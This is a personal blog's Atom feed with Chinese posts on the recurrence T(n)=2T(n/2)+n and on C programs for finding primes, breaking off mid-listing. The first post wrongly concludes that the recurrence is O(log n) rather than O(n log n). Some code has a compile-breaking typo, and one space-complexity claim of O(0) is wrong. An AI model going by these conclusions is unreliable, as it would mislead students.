<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoxiaoxy</title>
  
  
  <link href="http://xiaoxiaoxy1.github.io/atom.xml" rel="self"/>
  
  <link href="http://xiaoxiaoxy1.github.io/"/>
  <updated>2023-03-13T05:28:14.854Z</updated>
  <id>http://xiaoxiaoxy1.github.io/</id>
  
  <author>
    <name>xiaoxiaoxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于 T(n)=2T(n/2)+n 的复杂度计算</title>
    <link href="http://xiaoxiaoxy1.github.io/2023/03/13/%E5%85%B3%E4%BA%8E-T-n-2T-n-2-n-%E7%9A%84%E5%A4%8D%E6%9D%82%E5%BA%A6%E8%AE%A1%E7%AE%97/"/>
    <id>http://xiaoxiaoxy1.github.io/2023/03/13/%E5%85%B3%E4%BA%8E-T-n-2T-n-2-n-%E7%9A%84%E5%A4%8D%E6%9D%82%E5%BA%A6%E8%AE%A1%E7%AE%97/</id>
    <published>2023-03-13T04:04:54.000Z</published>
    <updated>2023-03-13T05:28:14.854Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\blog\source\_posts\关于-T-n-2T-n-2-n-的复杂度计算\</span><br></pre></td></tr></table></figure><h2 id="T-n-2T-n-2-n-的复杂度为-nlog-n"><a href="#T-n-2T-n-2-n-的复杂度为-nlog-n" class="headerlink" title="T(n)=2T(n/2)+n 的复杂度为 nlog(n)"></a>T(n)=2T(n/2)+n 的复杂度为 nlog(n)</h2><p><strong>昨天我的小伙伴问了我一道这样的题：</strong></p><p><img src="1876f31b4321f694f9a05f84630f33e.jpg" alt="1876f31b4321f694f9a05f84630f33e"></p><p><strong>这是答案：</strong></p><p><img src="image-20230313120744013.png" alt="image-20230313120744013"></p><p><img src="image-20230313120759187.png" alt="image-20230313120759187"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我的想法</span></span><br><span class="line">  在我看来，就将<span class="number">64</span>带入去算，按理来说计算量指数倍递减那么只需要大概 log2(<span class="number">64</span>)=<span class="number">6</span> 次计算就能得到结果，如果复杂度是nlogn那么按理来说要计算大概<span class="number">64</span>*log2(<span class="number">64</span>)=<span class="number">384</span>次才能得出计算结果，而我完全想不懂这<span class="number">384</span>次从哪来，我就理直气壮地和他说，“我打包票”，“答案是错的”，“出题老师水平不行”，“这题别管了”，”递归不懂多做点别的递归题“，“考研不会出现这种低级错误题”......叭叭一顿输出当晚后我就没管这个题了，我的小伙伴也没有再和我争论。</span><br></pre></td></tr></table></figure><p><strong>第二天：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为感觉昨晚的话说得有点过激，又觉得我不过是一个大学生，难道我能想到的，经验丰富的出题人就想不到？于是就找了找相关的文章</span><br></pre></td></tr></table></figure><p>于是就有了以下解答：</p><p>参考链接：<a href="https://blog.csdn.net/woshilsh/article/details/89429130">T(n)=2T(n/2)+n的解为T(n)=O(nlogn)的求解_woshilsh的博客-CSDN博客</a></p><p><img src="image-20230313122401116.png" alt="image-20230313122401116"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看了这个答案后我就开始怀疑人生了，难道真的是我错了？这个图我也挑不出毛病啊，然后我立马去向我的小伙伴认怂，“我是乡巴佬”，“昨天那题答案没错”，“你别被我带偏了”......可我没想到的是他的确没被我带偏，他就是认为答案是对的，还和我讲他的理解，然后我俩叭叭聊了一大堆，虽然他说的我基本都听不明白。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还是不死心 </span></span><br><span class="line">  因为总感觉nlog(n)这个数量级真的太大了，而这题的计算量本来就是指数级递减的，然后我就感觉是不是国内普遍都认为这题答案就这样，所以我又翻墙去外网找答案，看看有没有懂一点的外国网友，虽然找到的还是中国人发的贴子，不过也让我找回了自信</span><br><span class="line">  参考链接：https://www.zhihu.com/question/<span class="number">521524809</span></span><br></pre></td></tr></table></figure><p><img src="image-20230313123403619.png" alt="image-20230313123403619"></p><p><img src="image-20230313123616259.png" alt="image-20230313123616259"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有了以上提问与回答的精神支持后我又回头去看那个递归树，很快就发现了猫腻</span></span><br><span class="line"><span class="comment"># 明明是一个乘法，为什么要用加法来算？这不是徒增复杂度吗？</span></span><br></pre></td></tr></table></figure><p><img src="image-20230313123732740.png" alt="image-20230313123732740"></p><p><strong>于是我也有了我的递归树：</strong></p><p><img src="30bb81a41be0350f46f906c32c0c738.jpg" alt="30bb81a41be0350f46f906c32c0c738"></p><p>log2(n)层，每层两步运算，总的运算量为2log2(n)，复杂度级别为log2(n)</p><p><strong>ok，一切都明了了，log2(n)与nlog2(n)这两个相差甚远的结果是因为递归的方式不同：</strong></p><p>得出以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digui_logn</span><span class="params">(<span class="keyword">int</span> t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digui_nlogn</span><span class="params">(<span class="keyword">int</span> t)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> logn=<span class="number">0</span>,nlogn=<span class="number">0</span>,a,b,sum;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> logn_num,nlogn_num;</span><br><span class="line"></span><br><span class="line">    logn_num  = digui_logn(<span class="number">64</span>);</span><br><span class="line">    nlogn_num = digui_nlogn(<span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nlogn_num = %d\nnlogn_num = %d\n\n&quot;</span>,logn_num,nlogn_num);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nlogn = %d &lt;==&gt; log64\nnlogn = %d &lt;==&gt; 64log64\n\n&quot;</span>,logn,nlogn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digui_logn</span><span class="params">(<span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    logn += <span class="number">2</span>;    </span><br><span class="line">    <span class="keyword">if</span>(t == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;本层执行了一次乘法和一次加法，总运算次数加2 logn = %d\n&quot;</span>,logn);</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span>*digui_logn(t/<span class="number">2</span>)+t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digui_nlogn</span><span class="params">(<span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nlogn+=<span class="number">1</span>;    <span class="comment">//因为看网上画递归树的解法中没有把+t算进来，这里也不算进来</span></span><br><span class="line">    <span class="keyword">if</span>(t == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;本层执行了一次加法，总运算次数加1 nlogn = %d\n&quot;</span>,nlogn);</span><br><span class="line">    <span class="keyword">return</span> digui_nlogn(t/<span class="number">2</span>)+digui_nlogn(t/<span class="number">2</span>)+t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><p><img src="image-20230313124643678.png" alt="image-20230313124643678"></p><p>分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其实得出nlog2(n)与log2(n)这两个答案不过是递归方式的不同罢了</span></span><br><span class="line">  <span class="comment"># return digui_nlogn(t/2)+digui_nlogn(t/2)+t;   得到nlog2(n)</span></span><br><span class="line">  <span class="comment"># return (2*digui_logn(t/2)+t);    得到log2(n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 而题目中给的是2*T(n/2)+n，按理来说递归方式因该是return (2*digui_logn(t/2)+t);这一种</span></span><br><span class="line"><span class="comment"># 如果要算出nlog2(n)这一答案，至少得把题目改成 T(n/2)+T(n/2)+n 我才能接受</span></span><br></pre></td></tr></table></figure><p>感想：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实际上明明log2(n)就能解决的问题我们就应该用log2(n)解决，而不是用nlog2(n)</span></span><br><span class="line"><span class="comment"># 所以我不能接受出题人给的答案</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">考研题目</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>质数</title>
    <link href="http://xiaoxiaoxy1.github.io/2023/03/03/%E8%B4%A8%E6%95%B0/"/>
    <id>http://xiaoxiaoxy1.github.io/2023/03/03/%E8%B4%A8%E6%95%B0/</id>
    <published>2023-03-03T15:19:17.000Z</published>
    <updated>2023-03-11T10:05:55.047Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\blog\source\_posts\质数.assets\</span><br></pre></td></tr></table></figure><h2 id="一、获取质数集的方法"><a href="#一、获取质数集的方法" class="headerlink" title="一、获取质数集的方法"></a>一、获取质数集的方法</h2><p>注：一些个人收集的方法，以下代码未特定说明则均在 linux 操作系统上编译运行</p><h3 id="1、遍历"><a href="#1、遍历" class="headerlink" title="1、遍历"></a>1、遍历</h3><p>参考链接：<a href="https://blog.csdn.net/weixin_45870610/article/details/108687502"> C语言：找出10000以内所有的素数（质数）_求10000以内正整数中最大素数？_是彦歆呀嘻嘻哈哈的博客-CSDN博客</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,i,j,k=<span class="number">0</span>;</span><br><span class="line">    FILE *fp=<span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);  <span class="comment">//打开当前目录下的1.txt文件，没有则自动生成1.txt文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">2</span>;j*j&lt;=i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>)    <span class="comment">//判断i是否能被1和本身以外的数整除，%表示求余</span></span><br><span class="line">                <span class="keyword">break</span>;    <span class="comment">//break跳出第二个for循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j*j&gt;i)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">            k++;          <span class="comment">//每增加一个素数k就加1</span></span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">20</span>==<span class="number">0</span>)   <span class="comment">//一行打印10个数之后换行</span></span><br><span class="line">                <span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n  1 ~ %d 中含有 %d 个质数\n\n&quot;</span>,b,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以上代码计算的核心是以下两行代码</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">2</span>;j*j&lt;=i;j++)&#123;</span><br><span class="line">            </span><br><span class="line"><span class="comment">#这种遍历方式首先遍历一遍2-n ，计算复杂度大致为 O(n)</span></span><br><span class="line"><span class="comment">#其次遍历一遍2-√n，计算复杂度大致为 O(√n)</span></span><br><span class="line"><span class="comment">#所以总的计算复杂度大致为 O(n√n)</span></span><br><span class="line"><span class="comment">#空间复杂度O(0)</span></span><br><span class="line"><span class="comment">#我数学不太行，有错请指正</span></span><br></pre></td></tr></table></figure><p>问：产生的1.txt有什么用？</p><p>答：便于python处理</p><br/><h3 id="2、遍历优化"><a href="#2、遍历优化" class="headerlink" title="2、遍历优化"></a>2、遍历优化</h3><p>对我们得到的质数集进行观察我们可以发现：除2外，所有质数的末尾必是1、3、7、9中的一个，那我们可以对上面的算法进行以下优化：</p><p>(同理还可以知道：一个大于等于5的素数模12得到的值必是1、5、7、11)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c,i,j,k=<span class="number">0</span>;</span><br><span class="line">    FILE *fp=<span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);  <span class="comment">//打开当前目录下的1.txt文件，没有则自动生成1.txt文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将2、3、5写入文件，后续我们只需要考虑末尾为1、3、7、9的情况</span></span><br><span class="line">    <span class="built_in">fprintf</span>(fp,<span class="string">&quot;2,3,5,\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        c = i%<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="number">1</span> &amp;&amp; C!=<span class="number">3</span> &amp;&amp; c!=<span class="number">7</span> &amp;&amp; c!=<span class="number">9</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">2</span>;j*j&lt;=i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>)    <span class="comment">//判断i是否能被1和本身以外的数整除，%表示求余</span></span><br><span class="line">                <span class="keyword">break</span>;    <span class="comment">//break跳出第二个for循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(j*j&gt;i)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">            k++;          <span class="comment">//每增加一个素数k就加1</span></span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">20</span>==<span class="number">0</span>)   <span class="comment">//一行打印10个数之后换行</span></span><br><span class="line">                <span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    k+=<span class="number">3</span>;                 <span class="comment">//2、3、5还没算进来，得加3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n  1 ~ %d 中含有 %d 个质数\n\n&quot;</span>,b,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过一轮筛选，0-9可以筛掉6个数字，1-6/10=0.4，所以计算复杂度大致为O(0.4*n√n)，空间复杂度O(0)</p><h3 id="3、素数性质1"><a href="#3、素数性质1" class="headerlink" title="3、素数性质1"></a>3、素数性质1</h3><p>其实这个性质类似于我上面说的除2、3、5外，素数末尾必定是1、3、7、9</p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/347263073">求素数三种简单方法 - 知乎 (zhihu.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 链接可以不用看，我这里给出摘要：</span></span><br><span class="line">  <span class="number">1</span>、除 <span class="number">2</span>、<span class="number">3</span> 外，素数模 <span class="number">6</span> 等于 <span class="number">1</span> 或 <span class="number">5</span> </span><br><span class="line">  <span class="number">2</span>、一个模<span class="number">6</span>等于<span class="number">1</span>或<span class="number">5</span>的数不一定是素数，例：<span class="number">25</span>%<span class="number">6</span>=<span class="number">1</span>但<span class="number">25</span>不是素数</span><br></pre></td></tr></table></figure><p>利用以上性质，我们可以继续优化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c,d,e,i,j,k=<span class="number">0</span>;</span><br><span class="line">    FILE *fp=<span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);  <span class="comment">//打开当前目录下的1.txt文件，没有则自动生成1.txt文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将2、3、5写入文件，后续我们只需要考虑末尾为1、3、7、9的情况</span></span><br><span class="line">    <span class="built_in">fprintf</span>(fp,<span class="string">&quot;2,3,5,\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        c = i%<span class="number">10</span>;</span><br><span class="line">        d = i%<span class="number">12</span>;</span><br><span class="line">        e = i%<span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="number">1</span> &amp;&amp; c!=<span class="number">3</span> &amp;&amp; c!=<span class="number">7</span> &amp;&amp; c!=<span class="number">9</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(d!=<span class="number">1</span> &amp;&amp; d!=<span class="number">5</span> &amp;&amp; d!=<span class="number">7</span> &amp;&amp; d!=<span class="number">11</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(e!=<span class="number">1</span> &amp;&amp; e!=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">2</span>;j*j&lt;=i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>)    <span class="comment">//判断i是否能被1和本身以外的数整除，%表示求余</span></span><br><span class="line">                <span class="keyword">break</span>;    <span class="comment">//break跳出第二个for循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(j*j&gt;i)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">            k++;          <span class="comment">//每增加一个素数k就加1</span></span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">20</span>==<span class="number">0</span>)   <span class="comment">//一行打印10个数之后换行</span></span><br><span class="line">                <span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    k+=<span class="number">3</span>;                 <span class="comment">//2、3、5还没算进来，得加3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n  1 ~ %d 中含有 %d 个质数\n\n&quot;</span>,b,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：数字大了会出问题</p><p>以上的优化方式可以自行探索添加、但再加就不礼貌了，速率也不会提升多少，以上代码的空间代价几乎没有，内存不用存大数组。</p><h2 id="4、筛选法求质数"><a href="#4、筛选法求质数" class="headerlink" title="4、筛选法求质数"></a>4、筛选法求质数</h2><p>参考链接1：<a href="https://www.cnblogs.com/chucklu/p/4627058.html">求质数的几种算法 - ChuckLu - 博客园 (cnblogs.com)</a></p><p>参考链接2：<a href="https://blog.csdn.net/zhanghan950523/article/details/106179387">Bitmap C语言实现_geditzh的博客-CSDN博客</a></p><p>参考链接3：<a href="https://www.cnblogs.com/bluettt/p/13025259.html">C/C++手动实现sqrt() - cnwanglu - 博客园 (cnblogs.com)</a></p><p>个人理解：典型的空间换时间算法，求大范围素数时需要在内存中建立大数组，空间复杂度O(n)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 流程：假设要找200以内的质数，</span></span><br><span class="line">  <span class="number">1</span>、<span class="number">13</span>² &lt; <span class="number">200</span> &lt; <span class="number">14</span>²</span><br><span class="line">  <span class="number">2</span>、建立一个数组arr，存储<span class="number">0</span>-<span class="number">200</span>这<span class="number">200</span>个数字</span><br><span class="line">  <span class="number">3</span>、遍历<span class="number">2</span>-<span class="number">14</span>，删除数组arr内的所有遍历数的倍数(在代码实现中 删除 ≠ 释放空间)</span><br><span class="line">     (从<span class="number">2</span>开始，先删除所有<span class="number">2</span>的倍数，再删除所有<span class="number">3</span>的倍数...删除所有<span class="number">14</span>的倍数)</span><br><span class="line">  <span class="number">4</span>、得到一个全部为素数的数组      </span><br></pre></td></tr></table></figure><p>筛选法代码如下：(运用到bitmap的话，可以节约巨大的空间，一个int32位，一个bit一位，节约31/32左右的空间)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 